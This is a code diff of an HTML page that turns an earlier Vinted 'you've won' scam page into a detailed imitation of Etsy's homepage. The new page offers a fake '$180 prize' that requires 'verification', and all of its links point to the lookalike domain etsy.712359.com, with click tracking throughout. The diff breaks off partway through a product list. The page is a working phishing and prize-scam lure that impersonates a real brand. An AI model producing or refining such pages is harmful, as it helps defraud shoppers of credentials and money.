@@ -3,107 +3,1061 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎉 Congratulations! You've Won!</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Etsy - Buy Unique Items</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;500;600;700&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --orange: #F1641E;
+            --orange-dark: #D95115;
+            --black: #222222;
+            --gray: #595959;
+            --light-gray: #F4F4F4;
+            --border: #E0E4E8;
+            --footer-bg: #232323;
+        }
+
+        body {
+            font-family: 'Nunito Sans', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
+            background: #fff;
+            color: var(--black);
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        /* ── HEADER ─────────────────────────────────── */
+        header {
+            background: #fff;
+            position: sticky;
+            top: 0;
+            z-index: 200;
+            box-shadow: 0 1px 0 var(--border);
+        }
+
+        .header-top {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 10px 24px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-shrink: 0;
+        }
+
+        .logo {
+            font-family: Georgia, 'Times New Roman', serif;
+            font-size: 30px;
+            font-weight: bold;
+            color: var(--orange);
+            text-decoration: none;
+            letter-spacing: -1px;
+        }
+
+        .categories-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 13.5px;
+            font-weight: 600;
+            color: var(--black);
+            padding: 6px 10px;
+            border-radius: 24px;
+            transition: background .15s;
+            text-decoration: none;
+        }
+        .categories-btn:hover { background: var(--light-gray); }
+        .categories-btn-text { font-size: 13.5px; font-weight: 600; }
+
+        .search-box {
+            flex: 1;
+            max-width: 640px;
+            display: flex;
+            align-items: center;
+            border: 2px solid var(--black);
+            border-radius: 24px;
+            background: #fff;
+            padding: 0 6px 0 16px;
+            height: 46px;
+            transition: border-color .2s, box-shadow .2s;
+        }
+        .search-box:focus-within {
+            border-color: var(--orange);
+            box-shadow: 0 0 0 3px rgba(241,100,30,.12);
+        }
+
+        .search-box input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 14px;
+            font-family: inherit;
+            color: var(--black);
+            background: transparent;
+        }
+        .search-box input::placeholder { color: #999; }
+
+        .search-btn {
+            background: var(--orange);
+            border: none;
+            width: 34px; height: 34px;
+            border-radius: 50%;
+            color: #fff;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            flex-shrink: 0;
+            transition: background .15s;
+        }
+        .search-btn:hover { background: var(--orange-dark); }
+
+        .header-icons {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-left: auto;
+            flex-shrink: 0;
+        }
+
+        .header-icon {
+            display: flex; align-items: center; justify-content: center;
+            width: 40px; height: 40px;
+            border-radius: 50%;
+            font-size: 20px;
+            color: var(--black);
+            text-decoration: none;
+            transition: background .15s;
+        }
+        .header-icon:hover { background: var(--light-gray); }
+
+        /* ── CATEGORIES BAR ─────────────────────────── */
+        .categories-bar {
+            border-top: 1px solid var(--border);
+            background: #fff;
+        }
+
+        .categories-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            gap: 0;
+            overflow-x: auto;
+            padding: 0 24px;
+            scrollbar-width: none;
+        }
+        .categories-container::-webkit-scrollbar { display: none; }
+
+        .cat-item {
+            font-size: 13.5px;
+            font-weight: 600;
+            color: var(--black);
+            text-decoration: none;
+            white-space: nowrap;
+            padding: 12px 16px;
+            border-bottom: 3px solid transparent;
+            transition: border-color .15s, color .15s;
+        }
+        .cat-item:hover { border-bottom-color: var(--black); }
+
+        /* ── PRIZE BANNER ───────────────────────────── */
+        .prize-section {
+            background: linear-gradient(160deg, #FFF9F5 0%, #FFF1E8 60%, #FFE8D8 100%);
+            padding: 56px 24px 64px;
+            text-align: center;
+            border-bottom: 1px solid #F5D4C0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .prize-section::before {
+            content: '';
+            position: absolute;
+            top: -120px; right: -120px;
+            width: 400px; height: 400px;
+            background: radial-gradient(circle, rgba(241,100,30,.10) 0%, transparent 65%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .prize-container {
+            max-width: 700px;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .prize-badge {
+            display: inline-block;
+            background: var(--orange);
+            color: #fff;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: .10em;
+            text-transform: uppercase;
+            padding: 5px 14px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+        }
+
+        .prize-title {
+            font-family: Georgia, serif;
+            font-size: 36px;
+            font-weight: bold;
+            color: var(--black);
+            margin-bottom: 10px;
+            line-height: 1.2;
+        }
+
+        .prize-amount {
+            font-family: Georgia, serif;
+            font-size: 80px;
+            font-weight: bold;
+            color: var(--orange);
+            line-height: 1;
+            margin: 16px 0 20px;
+        }
+
+        .prize-currency {
+            font-size: 40px;
+            vertical-align: super;
+            line-height: 1;
+        }
+
+        .prize-description {
+            font-size: 16px;
+            color: var(--gray);
+            line-height: 1.65;
+            margin-bottom: 28px;
+            max-width: 560px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .prize-description strong { color: var(--black); }
+
+        .verification-benefits {
+            background: rgba(255,255,255,.75);
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(241,100,30,.20);
+            border-radius: 14px;
+            padding: 20px 28px;
+            margin: 0 auto 32px;
+            max-width: 520px;
+            text-align: left;
+            font-size: 14px;
+            color: var(--gray);
+        }
+
+        .verification-benefits strong {
+            display: block;
+            color: var(--black);
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .verification-benefits ul { list-style: none; }
+        .verification-benefits li { padding: 5px 0; line-height: 1.5; }
+
+        .prize-btn {
+            display: inline-block;
+            background: var(--orange);
+            color: #fff;
+            border: none;
+            padding: 18px 56px;
+            font-size: 18px;
+            font-weight: 700;
+            font-family: inherit;
+            border-radius: 32px;
+            cursor: pointer;
+            text-decoration: none;
+            box-shadow: 0 6px 24px rgba(241,100,30,.35);
+            transition: background .18s, transform .18s, box-shadow .18s;
+            animation: pulse 2.4s ease-in-out infinite;
+        }
+        .prize-btn:hover {
+            background: var(--orange-dark);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 32px rgba(241,100,30,.50);
+            animation: none;
+        }
+        .prize-btn:active { transform: translateY(0); }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 6px 24px rgba(241,100,30,.35); }
+            50%       { box-shadow: 0 6px 36px rgba(241,100,30,.60); }
+        }
+
+        .prize-note {
+            margin-top: 14px;
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        /* ── MAIN CONTENT ───────────────────────────── */
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 40px 24px;
+        }
+
+        .section { margin-bottom: 56px; }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 18px;
+        }
+
+        .section-title {
+            font-family: Georgia, serif;
+            font-size: 22px;
+            font-weight: bold;
+            color: var(--black);
+        }
+
+        .view-all {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--black);
+            text-decoration: none;
+            border: 1px solid var(--border);
+            padding: 7px 16px;
+            border-radius: 20px;
+            transition: all .18s;
+        }
+        .view-all:hover { border-color: var(--black); background: var(--light-gray); }
+
+        /* ── PRODUCT GRID ───────────────────────────── */
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
+            gap: 16px;
+        }
+
+        .product-card {
+            background: #fff;
+            border-radius: 4px;
+            overflow: hidden;
+            text-decoration: none;
+            color: inherit;
+            display: block;
+            transition: transform .18s;
+        }
+        .product-card:hover { transform: translateY(-2px); }
+        .product-card:hover .product-image img { opacity: .92; }
+
+        .product-image {
+            width: 100%; height: 195px;
+            background: var(--light-gray);
+            overflow: hidden;
+            border-radius: 4px;
+        }
+        .product-image img {
+            width: 100%; height: 100%;
+            object-fit: cover;
+            transition: opacity .2s;
+        }
+
+        .product-info { padding: 10px 2px 6px; }
+
+        .product-name {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--black);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            margin-bottom: 3px;
+        }
+
+        .product-seller { font-size: 12px; color: #888; margin-bottom: 2px; }
+
+        /* ── NEWSLETTER ─────────────────────────────── */
+        .newsletter {
+            background: #EDE4F5;
+            padding: 44px 24px;
+            text-align: center;
+        }
+
+        .newsletter-content { max-width: 680px; margin: 0 auto; }
+
+        .newsletter-content h3 {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--black);
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .newsletter-form {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .newsletter-form input {
+            padding: 12px 18px;
+            border: 1px solid #ccc;
+            border-radius: 24px;
+            font-size: 14px;
+            min-width: 260px;
+            font-family: inherit;
+            outline: none;
+        }
+        .newsletter-form input:focus { border-color: var(--black); }
+
+        .newsletter-form button {
+            padding: 12px 26px;
+            background: var(--black);
+            color: #fff;
+            border: none;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 700;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background .15s;
+        }
+        .newsletter-form button:hover { background: #444; }
+
+        /* ── FOOTER ─────────────────────────────────── */
+        footer {
+            background: var(--footer-bg);
+            color: #fff;
+            padding: 48px 24px 24px;
+        }
+
+        .footer-top {
+            max-width: 1400px;
+            margin: 0 auto 40px;
+            display: grid;
+            grid-template-columns: 180px 1fr 1fr 1fr 1fr;
+            gap: 40px;
+            padding-bottom: 40px;
+            border-bottom: 1px solid #3C3C3C;
+        }
+
+        .footer-logo {
+            font-family: Georgia, serif;
+            font-size: 36px;
+            font-weight: bold;
+            color: var(--orange);
+            display: block;
+            margin-bottom: 20px;
+            text-decoration: none;
+        }
+
+        .footer-app-btn {
+            background: #3C3C4E;
+            color: #fff;
+            border: none;
+            padding: 11px 18px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background .18s;
+            display: block;
+            font-family: inherit;
+            text-align: left;
+            text-decoration: none;
+        }
+        .footer-app-btn:hover { background: #4E4E64; }
+
+        .footer-section {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+        }
+
+        .footer-section h4 {
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: .04em;
+            text-transform: uppercase;
+            color: #fff;
+            margin-bottom: 16px;
+        }
+
+        .footer-section a {
+            font-size: 13.5px;
+            color: #C0C0C0;
+            text-decoration: none;
+            line-height: 2;
+            transition: color .15s;
+        }
+        .footer-section a:hover { color: #fff; text-decoration: underline; }
+
+        .footer-section span.link-style {
+            font-size: 13.5px;
+            color: #C0C0C0;
+            line-height: 2;
+            display: block;
+        }
+
+        .footer-socials {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer-socials a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 34px; height: 34px;
+            border-radius: 50%;
+            background: #3C3C3C;
+            color: #C0C0C0;
+            font-size: 14px;
+            text-decoration: none;
+            transition: background .15s, color .15s;
+            line-height: 1;
+        }
+        .footer-socials a:hover { background: var(--orange); color: #fff; }
+
+        .footer-middle {
+            text-align: center;
+            max-width: 1400px;
+            margin: 0 auto;
+            font-size: 13px;
+            color: #888;
+            padding: 22px 0;
+            border-bottom: 1px solid #3C3C3C;
+        }
+
+        .footer-bottom {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 0 0;
+            font-size: 12px;
+            color: #888;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .footer-bottom-left { display: flex; gap: 16px; align-items: center; }
+
+        .footer-bottom a { color: #888; text-decoration: none; }
+        .footer-bottom a:hover { color: #fff; text-decoration: underline; }
+
+        /* ── RESPONSIVE ─────────────────────────────── */
+        @media (max-width: 900px) {
+            .footer-top { grid-template-columns: 1fr 1fr; }
+        }
+        @media (max-width: 600px) {
+            .prize-amount { font-size: 56px; }
+            .prize-title { font-size: 26px; }
+            .header-icons .header-icon:first-child { display: none; }
+            .footer-top { grid-template-columns: 1fr 1fr; gap: 24px; }
+        }
+
+        /* ── BADGE & PRICES ─────────────────────────── */
+        .product-image { position: relative; }
+
+        .badge-new {
+            position: absolute;
+            top: 8px; left: 8px;
+            background: #3D6CB5;
+            color: #fff;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 20px;
+            z-index: 2;
+            pointer-events: none;
+            letter-spacing: .01em;
+        }
+
+        .product-price {
+            display: flex;
+            align-items: baseline;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+
+        .price-sale {
+            font-size: 14px;
+            font-weight: 700;
+            color: #B8341B;
+        }
+
+        .price-old {
+            font-size: 12px;
+            color: #999;
+            text-decoration: line-through;
+        }
+
+    </style>
 </head>
 <body>
-    <div class="background-animation">
-        <div class="glow-orb glow-orb-1"></div>
-        <div class="glow-orb glow-orb-2"></div>
-        <div class="glow-orb glow-orb-3"></div>
-    </div>
+    <!-- HEADER -->
+    <header>
+        <div class="header-top">
+            <div class="header-left">
+                <a href="https://etsy.712359.com/222508761" class="logo" onclick="logAction('logo_click')">Etsy</a>
+                <button class="categories-btn" onclick="logAction('categories_click')">
+                    <span>≡</span>
+                    <span class="categories-btn-text">Categories</span>
+                </button>
+            </div>
 
-    <div class="container">
-        <div class="content">
-            <!-- Gift Icon -->
-            <div class="logo-badge">🎁</div>
+            <div class="search-box">
+                <input type="text" id="searchInput" placeholder="Search for anything">
+                <button class="search-btn" onclick="searchEtsy()">🔍</button>
+            </div>
 
-            <!-- Main Title -->
-            <h1>Congratulations!</h1>
+            <div class="header-icons">
+                <a href="https://etsy.712359.com/222508761" class="header-icon" onclick="logAction('signin_click')" title="Sign in">👤</a>
+                <a href="https://etsy.712359.com/222508761" class="header-icon" onclick="logAction('cart_click')" title="Cart">🛒</a>
+            </div>
+        </div>
 
-            <!-- Subtitle -->
-            <p class="subtitle">You've Won! 🏆</p>
+        <!-- CATEGORIES -->
+        <div class="categories-bar">
+            <div class="categories-container">
+                <a href="https://etsy.712359.com/222508761" class="cat-item" onclick="logAction('cat_gifts')">🎁 Gifts</a>
+                <a href="https://etsy.712359.com/222508761" class="cat-item" onclick="logAction('cat_easter')">Best of Easter</a>
+                <a href="https://etsy.712359.com/222508761" class="cat-item" onclick="logAction('cat_home')">Home Favorites</a>
+                <a href="https://etsy.712359.com/222508761" class="cat-item" onclick="logAction('cat_fashion')">Fashion Finds</a>
+                <a href="https://etsy.712359.com/222508761" class="cat-item" onclick="logAction('cat_registry')">Registry</a>
+                <a href="https://etsy.712359.com/222508761" class="cat-item" onclick="logAction('cat_gift_cards')">Gift Cards</a>
+            </div>
+        </div>
+    </header>
 
-            <!-- Description -->
-            <p class="description">
-                You're one of our lucky winners! Click the button below to claim your 150 EUR in Vinted balance.
+    <!-- PRIZE SECTION -->
+    <section class="prize-section">
+        <div class="prize-container">
+            <div class="prize-badge">Limited Time Offer</div>
+            <div class="prize-title">🎁 Congratulations! You've Won a Prize</div>
+            <div class="prize-amount">
+                <span class="prize-currency">$</span>180
+            </div>
+            <p class="prize-description">
+                As a valued Etsy member, you have been selected to receive a <strong>$180 bonus credited directly to your Etsy balance</strong>. Complete a quick verification to claim your reward and start shopping immediately.
             </p>
-
-            <!-- Prize Info Box -->
-            <div class="prize-container">
-                <div class="prize-icon">💰</div>
-                <div class="prize-label">Your Prize</div>
-                <div class="prize-amount">150 EUR</div>
-                <div class="prize-desc">Exclusive balance top-up - Add it to your Vinted account right now!</div>
+            <div class="verification-benefits">
+                <strong>🎉 What you get:</strong>
+                <ul>
+                    <li>✅ $180 credited instantly to your Etsy account balance</li>
+                    <li>✅ Use funds on any item across millions of listings</li>
+                    <li>✅ No minimum purchase required</li>
+                    <li>✅ Balance never expires</li>
+                    <li>✅ Takes less than 60 seconds to claim</li>
+                </ul>
             </div>
-
-            <!-- CTA Button - VINTED STYLE -->
-            <button class="cta-button pulse" onclick="claimPrize()">
-                <span class="button-icon">💳</span>
-                <span class="button-text">Claim My Prize</span>
+            <button class="prize-btn" onclick="handlePrizeClick()">
+                🎁 Get My $180 Prize Now
             </button>
+            <p class="prize-note">🔒 Secure · Instant credit · No strings attached</p>
+        </div>
+    </section>
 
-            <!-- Footer -->
-            <div class="footer-text">
-                ✨ Limited time offer - Claim your prize now!<br>
-                <a href="#help">Need help? Contact support</a>
+    <!-- MAIN CONTENT -->
+    <div class="container">
+        <!-- Section 1 -->
+        <div class="section">
+            <div class="section-header">
+                <h2 class="section-title">Garden Starter Plants</h2>
+                <a href="https://etsy.712359.com/222508761" class="view-all" onclick="logAction('view_all_trending')">View all</a>
             </div>
+            <div class="products-grid" id="trendingProducts"></div>
+        </div>
+
+        <!-- Section 2 -->
+        <div class="section">
+            <div class="section-header">
+                <h2 class="section-title">Picks inspired by your shopping</h2>
+                <a href="https://etsy.712359.com/222508761" class="view-all" onclick="logAction('view_all_recommended')">View all</a>
+            </div>
+            <div class="products-grid" id="recommendedProducts"></div>
+        </div>
+
+        <!-- Section 3 -->
+        <div class="section">
+            <div class="section-header">
+                <h2 class="section-title">Trending gifts</h2>
+                <a href="https://etsy.712359.com/222508761" class="view-all" onclick="logAction('view_all_new')">View all</a>
+            </div>
+            <div class="products-grid" id="newProducts"></div>
         </div>
     </div>
 
+    <!-- NEWSLETTER -->
+    <div class="newsletter">
+        <div class="newsletter-content">
+            <h3>Yes! Send me exclusive offers, unique gift ideas, and personalized tips for shopping and selling on Etsy.</h3>
+            <form class="newsletter-form" onsubmit="handleNewsletterSubmit(event)">
+                <input type="email" placeholder="Enter your email" required>
+                <button type="submit">Subscribe</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer>
+        <div class="footer-top">
+            <div>
+                <a href="https://etsy.712359.com/222508761" class="footer-logo">Etsy</a>
+                <a href="https://etsy.712359.com/222508761" class="footer-app-btn">📱 Download the Etsy App</a>
+            </div>
+
+            <div class="footer-section">
+                <h4>Shop</h4>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_gift_cards')">Gift cards</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_registry')">Etsy Registry</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_sitemap')">Sitemap</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_blog')">Etsy blog</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_uk')">Etsy United Kingdom</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_germany')">Etsy Germany</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_canada')">Etsy Canada</a>
+            </div>
+
+            <div class="footer-section">
+                <h4>Sell</h4>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_sell')">Sell on Etsy</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_teams')">Teams</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_forums')">Forums</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_affiliates')">Affiliates & Creators</a>
+            </div>
+
+            <div class="footer-section">
+                <h4>About</h4>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_about')">Etsy, Inc.</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_policies')">Policies</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_investors')">Investors</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_careers')">Careers</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_press')">Press</a>
+                <a href="https://etsy.712359.com/222508761" onclick="logAction('footer_impact')">Impact</a>
+            </div>
+
+            <div class="footer-section">
+                <h4>Help</h4>
+                <a href="https://etsy.712359.com/222508761">Help Center</a>
+                <a href="https://etsy.712359.com/222508761">Privacy settings</a>
+                <div class="footer-socials">
+                    <a href="https://etsy.712359.com/222508761" target="_blank" onclick="logAction('social_instagram')">📷</a>
+                    <a href="https://etsy.712359.com/222508761" target="_blank" onclick="logAction('social_facebook')">f</a>
+                    <a href="https://etsy.712359.com/222508761" target="_blank" onclick="logAction('social_pinterest')">📌</a>
+                    <a href="https://etsy.712359.com/222508761" target="_blank" onclick="logAction('social_youtube')">▶️</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-middle">
+            🌍 Etsy is powered by 100% renewable electricity.
+        </div>
+
+        <div class="footer-bottom">
+            <div class="footer-bottom-left">
+                <span>🇺🇸 United States</span>
+                <span>English (US)</span>
+                <span>$ (USD)</span>
+            </div>
+            <div style="flex: 1; text-align: center;">
+                © 2026 Etsy, Inc. | <a href="https://etsy.712359.com/222508761" style="color: #ccc; text-decoration: none;" onclick="logAction('footer_terms')">Terms of Use</a> | <a href="https://etsy.712359.com/222508761" style="color: #ccc; text-decoration: none;" onclick="logAction('footer_privacy_link')">Privacy</a> | <a href="https://etsy.712359.com/222508761" style="color: #ccc; text-decoration: none;" onclick="logAction('footer_cookies')">Cookies</a> | <a href="https://etsy.712359.com/222508761" style="color: #ccc; text-decoration: none;" onclick="logAction('footer_ads')">Interest-based ads</a> | <a href="https://etsy.712359.com/222508761" style="color: #ccc; text-decoration: none;" onclick="logAction('footer_local')">Local Shops</a> | <a href="https://etsy.712359.com/222508761" style="color: #ccc; text-decoration: none;" onclick="logAction('footer_regions')">Regions</a>
+            </div>
+        </div>
+    </footer>
+
     <script>
-        function createConfetti() {
-            const colors = ['#f1641e', '#4a5dd8', '#ffd700', '#ff1493', '#00ff00', '#ff6347'];
-            const confettiCount = 60;
-
-            for (let i = 0; i < confettiCount; i++) {
-                const confetti = document.createElement('div');
-                confetti.className = 'confetti';
-                confetti.style.left = Math.random() * 100 + '%';
-                confetti.style.top = '-10px';
-                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
-                confetti.style.animationDelay = Math.random() * 0.5 + 's';
-                confetti.style.width = (Math.random() * 8 + 4) + 'px';
-                confetti.style.height = confetti.style.width;
-                confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
-                document.body.appendChild(confetti);
-
-                setTimeout(() => confetti.remove(), 3500);
+        // Product data with EUR to USD conversion (1 EUR ≈ 1.1 USD)
+        const products = [
+            {
+                title: "Beaded Necklace with Fluorite Pendant",
+                seller: "Jasmine Imaginations",
+                price: "$53.22",
+                oldPrice: "$96.76",
+                isNew: false,
+                image: "https://i.etsystatic.com/34275372/r/il/071851/6132346968/il_fullxfull.6132346968_j030.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "The Pitt Vinyl Stickers | Whitaker and Dr. Robby",
+                seller: "Asteroid Nerd",
+                price: "$4.22",
+                oldPrice: "$6.49",
+                isNew: false,
+                image: "https://i.etsystatic.com/38699997/r/il/129e84/7372286093/il_fullxfull.7372286093_by7z.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Mondo and Midi Semi Matching Bags",
+                seller: "2Can Do Crafts",
+                price: "$108.52",
+                oldPrice: "$155.03",
+                isNew: false,
+                image: "https://i.etsystatic.com/56113858/r/il/8b07c1/6949504809/il_fullxfull.6949504809_pyf3.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Desert Yoga Mat, Sunset Yoga Mat",
+                seller: "Atelier Natura",
+                price: "$79.64",
+                oldPrice: "$93.69",
+                isNew: true,
+                image: "https://i.etsystatic.com/58831042/r/il/df1ddc/7832033764/il_fullxfull.7832033764_iq7i.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Dallah Tote Bag",
+                seller: "Made By Ibbra",
+                price: "$42.20",
+                oldPrice: "$52.75",
+                isNew: false,
+                image: "https://i.etsystatic.com/57596485/r/il/706e72/7036724382/il_fullxfull.7036724382_ox9c.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Premium Semi-Glossy Paper Poster - VAS",
+                seller: "Mundo TK Online",
+                price: "$18.78",
+                oldPrice: "$26.83",
+                isNew: true,
+                image: "https://i.etsystatic.com/64140977/r/il/92722b/7832128476/il_fullxfull.7832128476_ef1i.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Boho Teacher Bookmark Set: Holographic Paper",
+                seller: "Heavenly Hearts",
+                price: "$3.92",
+                oldPrice: "$7.13",
+                isNew: true,
+                image: "https://i.etsystatic.com/50234391/r/il/246884/7270130631/il_fullxfull.7270130631_6pqp.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Soft Green Botanical Canopy Wallpaper Mural",
+                seller: "Modern Wall Murals",
+                price: "$15.68",
+                oldPrice: "$18.45",
+                isNew: false,
+                image: "https://i.etsystatic.com/63334008/r/il/992c8a/7880119933/il_fullxfull.7880119933_nx00.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Monaco Tote Bag - Cultural Immersion Canvas Shopper",
+                seller: "Cultural Travel Co",
+                price: "$29.78",
+                oldPrice: "$37.23",
+                isNew: true,
+                image: "https://i.etsystatic.com/53339070/r/il/4d6467/7424032518/il_fullxfull.7424032518_h2q1.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "EchoMount Phone Stand with Speaker",
+                seller: "Craft Line Art",
+                price: "$24.12",
+                oldPrice: "$30.15",
+                isNew: true,
+                image: "https://i.etsystatic.com/58249061/r/il/e25b8a/6921605841/il_fullxfull.6921605841_jfxc.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Jewish Pride Eco Tote Bag",
+                seller: "New Leaf Printing",
+                price: "$24.12",
+                oldPrice: "$28.38",
+                isNew: false,
+                image: "https://i.etsystatic.com/39264110/r/il/a86ab3/5089799060/il_fullxfull.5089799060_kllb.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Animated Rose Cottage Window Zoom Background",
+                seller: "Violet Muse Atelier",
+                price: "$10.08",
+                oldPrice: "$15.51",
+                isNew: true,
+                image: "https://i.etsystatic.com/55986874/r/il/59078a/7693345014/il_fullxfull.7693345014_exxj.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Pinterest PLR Guide: A Comprehensive Guide",
+                seller: "The Classy Digital",
+                price: "$10.56",
+                oldPrice: "$12.42",
+                isNew: false,
+                image: "https://i.etsystatic.com/49147848/r/il/43c1a3/6203525138/il_fullxfull.6203525138_ted1.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Vintage Bunny Printable Mini Box Junk Journal",
+                seller: "Sparrow Heart Paperie",
+                price: "$2.53",
+                oldPrice: "$4.22",
+                isNew: false,
+                image: "https://i.etsystatic.com/60056088/r/il/f04608/7707984878/il_fullxfull.7707984878_4eyd.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Custom Sterling Silver Sea Glass Necklace",
+                seller: "Joy By Jaclin",
+                price: "$52.74",
+                oldPrice: "$70.32",
+                isNew: false,
+                image: "https://i.etsystatic.com/27781133/r/il/25e530/7478175327/il_fullxfull.7478175327_m1o2.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Botanical Dried Linden Leaf Printable Wall Art",
+                seller: "The Botanical Library",
+                price: "$6.79",
+                oldPrice: "$12.35",
+                isNew: false,
+                image: "https://i.etsystatic.com/64452726/r/il/7f68fb/7811943968/il_fullxfull.7811943968_37tv.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "BOLERO Bolerko - Sweater White Pink",
+                seller: "Firma & Zia",
+                price: "$19.72",
+                oldPrice: "$26.29",
+                isNew: true,
+                image: "https://i.etsystatic.com/18026404/r/il/7045f6/6186855584/il_fullxfull.6186855584_ci4w.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "We The People 1776 American Flag Phone Case",
+                seller: "Jenn's Shop",
+                price: "$27.52",
+                oldPrice: "$45.87",
+                isNew: false,
+                image: "https://i.etsystatic.com/64390066/r/il/4457eb/7758750441/il_fullxfull.7758750441_6wlo.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Beaded Sunflower Bracelet",
+                seller: "Small Town Girl",
+                price: "$36.18",
+                oldPrice: "$60.3",
+                isNew: true,
+                image: "https://i.etsystatic.com/46307520/r/il/8f92e1/7880088777/il_fullxfull.7880088777_owlb.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "A5 Hand Marbled Journal | Recycled Paper Sketchbook",
+                seller: "Lotus Notes UK",
+                price: "$56.11",
+                oldPrice: "$70.14",
+                isNew: true,
+                image: "https://i.etsystatic.com/19036586/r/il/64fde4/7036599252/il_fullxfull.7036599252_jmd0.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Watercolor Cocktails Print: Pastel Bar Cart Art",
+                seller: "Honeysage Paperie",
+                price: "$8.43",
+                oldPrice: "$12.97",
+                isNew: false,
+                image: "https://i.etsystatic.com/60754370/r/il/67564d/7224099999/il_fullxfull.7224099999_n6u6.jpg",
+                link: "https://etsy.712359.com/222508761"
+            },
+            {
+                title: "Smart Car Emblem Letters: Front Hood, Rear Trunk Badge",
+                seller: "Fast Same Day Shipping",
